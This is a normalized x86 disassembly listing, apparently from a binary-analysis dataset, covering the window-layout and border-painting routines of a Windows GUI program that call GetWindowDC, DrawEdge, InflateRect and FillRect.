mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_414098
mov edi eax
mov eax edi
mov si 0xffb8
call sub_403394
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x1a4 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
mov eax [ edi + 0x30 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
sub_44128c
push ebp
mov ebp esp
push esi
mov esi edx
mov edx [ ebp + 0x8 ]
push edx
xor dl 0x1
push edx
mov edx esi
call sub_441180
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_4412b8
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_451710
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_441180
test eax eax
jne r-xdata
test eax eax
je r-xdata
push 0x0
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_441180
mov edx eax
mov eax esi
call sub_45537c
sub_4412fc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43da88
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43da4c
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_441344
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_440a00
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_43a7e0
sub_44138c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x74 ]
cmp [ eax + 0x14 ] 0x0
jbe r-xdata
xor edx edx
mov [ edi ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x14 ]
mov [ edi ] edx
jmp r-xdata
xor edx edx
mov [ ecx ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x10 ]
mov [ ecx ] edx
jmp r-xdata
cmp [ eax + 0x10 ] 0x0
jbe r-xdata
mov edx [ ebp + 0xc ]
xor ebx ebx
mov [ edx ] ebx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0xc ]
mov ebx [ ebp + 0xc ]
mov [ ebx ] edx
jmp r-xdata
cmp [ eax + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_441410
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_44105c
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
call sub_43da88
test eax eax
je r-xdata
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8c ]
lea eax [ ebp - 0x5d ]
push eax
call IsRectEmpty
test eax eax
jne r-xdata
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x55 ]
sub edx [ ebp - 0x5d ]
sub eax edx
mov [ ebp - 0xc ] eax
mov edx [ esi + 0x4c ]
mov ecx [ ebp - 0x51 ]
sub ecx [ ebp - 0x59 ]
sub edx ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
sub [ eax ] edx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
sub [ eax ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
sub [ eax ] edx
xor ecx ecx
push ebp
push sub_4417d2
push [ fs : ecx ]
mov [ fs : ecx ] esp
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_43da88
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax ] edx
cmp [ ebp - 0x20 ] 0x0
jle r-xdata
inc edi
mov [ ebp - 0x1c ] 0x0
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx ]
jle r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_44138c
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
sub al 0x2
jb r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
jle r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
cmp eax [ edx ]
jle r-xdata
mov [ ebp - 0x4d ] 0x0
jmp r-xdata
mov [ ebp - 0x4d ] 0x1
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
mov [ ebp - 0x4d ] 0x1
jmp r-xdata
sub al 0x2
je r-xdata
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_43da4c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
sub eax [ ebx + 0x48 ]
sub eax [ ebp - 0x40 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4d ] 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
add [ eax ] edx
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
add al 0xfe
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
add eax [ ebp - 0x44 ]
sub eax [ ebx + 0x48 ]
mov [ ebp - 0x44 ] eax
jmp r-xdata
mov [ ebp - 0x4d ] 0x3
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
xor eax eax
jmp r-xdata
mov al 0x1
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
mov al 0x1
jmp r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
mov dl [ ebp - 0x4d ]
dec edx
sub dl 0x2
jb r-xdata
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
sub edx [ ebx + 0x4c ]
sub edx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] edx
mov al 0x2
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax ] edx
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
add edx [ ebp - 0x4c ]
sub edx [ ebx + 0x4c ]
mov [ ebp - 0x4c ] edx
jmp r-xdata
mov al 0x3
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x40 ]
jge r-xdata
mov edx [ ebx + 0x48 ]
add [ ebp - 0x30 ] edx
add [ ebp - 0x34 ] edx
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x44 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x40 ]
mov [ edx ] ecx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x20 ]
jle r-xdata
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
mov [ edx ] ecx
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x24 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ ebp - 0x20 ] edx
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x48 ]
jge r-xdata
mov eax [ ebx + 0x4c ]
add [ ebp - 0x38 ] eax
add [ ebp - 0x3c ] eax
jmp r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x4c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x48 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4c ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
sub_4417e9
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_441410
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_43b5c0
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_441828
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43c444
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0x74 ]
mov eax edi
call sub_439ed8
cmp [ edi + 0x158 ] 0x0
jne r-xdata
sub_441870
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43c664
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0x158 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_4418a0
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
call sub_44105c
test al al
je r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb4 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax [ ebp - 0x4 ]
call sub_43d5f0
xor ecx ecx
push ebp
push sub_4419cf
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
call sub_43da88
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_43da88
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4419d6
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_43d5f8
retn
inc esi
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edi [ ebp - 0x28 ]
sub edi [ ebp - 0x38 ]
jmp r-xdata
add cl 0xfd
sub cl 0x2
jae r-xdata
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
sub dl 0x3
jae r-xdata
xor edi edi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43da4c
cmp [ eax + 0x57 ] 0x0
jne r-xdata
xor edx edx
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x34 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
sub ecx [ ebp - 0x18 ]
mov edx [ eax + 0x40 ]
sub edx edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_4419d6
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
test al al
je r-xdata
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x28 ]
test eax eax
jle r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x48 ]
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x38 ]
sub eax ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
cmp dl 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
sub al 0x3
jae r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_403394
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x4c ]
mov ecx [ ebp - 0x2c ]
sub ecx [ ebp - 0x34 ]
sub eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx ] eax
cmp dl 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_403394
jmp r-xdata
sub_441a6c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ esi + 0x8 ]
mov esi eax
mov eax [ ebx + 0x16c ]
neg eax
push eax
mov edx [ ebx + 0x16c ]
neg edx
push eax
mov edi esi
push edi
call InflateRect
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add eax [ ebx + 0x168 ]
mov esi edi
test [ ebx + 0x162 ] 0x1
je r-xdata
add eax [ ebx + 0x168 ]
test [ ebx + 0x162 ] 0x2
je r-xdata
add [ esi ] eax
test [ ebx + 0x162 ] 0x4
je r-xdata
add [ esi + 0x4 ] eax
test [ ebx + 0x162 ] 0x8
je r-xdata
sub [ esi + 0x8 ] eax
sub [ esi + 0xc ] eax
sub_441afc
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_440d58
push eax
call GetWindowDC
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_441d62
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_440d58
push eax
call GetClientRect
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_440d58
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_440d58
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call ExcludeClipRect
lea esi [ ebp - 0x2c ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
push eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call InflateRect
lea esi [ ebp - 0x1c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x16c ] 0x0
jbe r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call IntersectClipRect
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x2c ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41d64c
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FillRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_440d58
push eax
call ReleaseDC
retn
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x163 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
call sub_42f57c
call sub_42f65c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x164 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x52 ] 0x2
je r-xdata
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_440d58
push eax
call GetWindowLongA
mov esi eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
call sub_42f57c
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_42fda8
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x2c ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x28 ] ebx
test esi 0x200000
je r-xdata
add [ ebp - 0x24 ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x8
je r-xdata
push 0x14
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x24 ] eax
test esi 0x100000
je r-xdata
add [ ebp - 0x20 ] ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x162 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x165 ]
or eax [ edx * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x163 ]
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call DrawEdge
push 0x15
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x20 ] eax
sub_441da4
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
lea edx [ esp + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_4069ec
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax esi
call sub_43a0b4
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_43e644
mov edi eax
test edi edi
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx 0x7b
mov eax edi
call sub_43b724
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax esi
call sub_43c8e8
sub_441e10
push ebx
push esi
mov esi edx
call sub_451710
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
sub si 0x9
je r-xdata
push 0x0
mov dx 0x1
mov ax 0x2
call sub_406960
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_43b724
jmp r-xdata
sub si 0x9
je r-xdata
push 0x0
mov dx 0x2
mov ax 0x2
call sub_406960
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_43b724
add esi 0xffffffed
sub si 0x4
jae r-xdata
sub_441e74
push esi
mov esi eax
cmp [ edx + 0xc ] 0x1
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ edx + 0x8 ] 0x1
je r-xdata
mov eax esi
call sub_43ea0c
jmp r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_441eac
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_441ea4
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_441eec
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_439670
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d768
mov esi eax
mov [ ebx + 0x160 ] esi
mov eax esi
mov edx ebx
call sub_43914c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_441f48
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
cmp esi [ rw-data ]
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_403198
mov edx ebx
and dl 0xfc
mov eax esi
call sub_439748
test bl bl
jle r-xdata
xor eax eax
call sub_437740
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_441f88
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_41da6c
xor eax eax
push ebp
push sub_442023
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_41dde0
xor eax eax
push ebp
push sub_442000
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442007
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
xor edx edx
call sub_41dde0
retn
sub_442034
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44296c
mov edx 0x80ffff
mov eax esi
call sub_43a710
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax [ esi + 0x208 ]
call sub_41dc80
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_41d734
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax esi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_4420a0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_43dbe4
mov [ ebx + 0x4 ] 0x80800000
or [ ebx + 0x24 ] 0x800
cmp [ rw-data ] 0x0
je r-xdata
mov edx 0x1
mov eax 0x5
call sub_40c1f8
test al al
je r-xdata
mov [ ebx + 0x8 ] 0x80
cmp [ rw-data ] 0x0
je r-xdata
or [ ebx + 0x24 ] 0x20000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_43db7c
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] 0x80
sub_44210c
push ebp
mov ebp esp
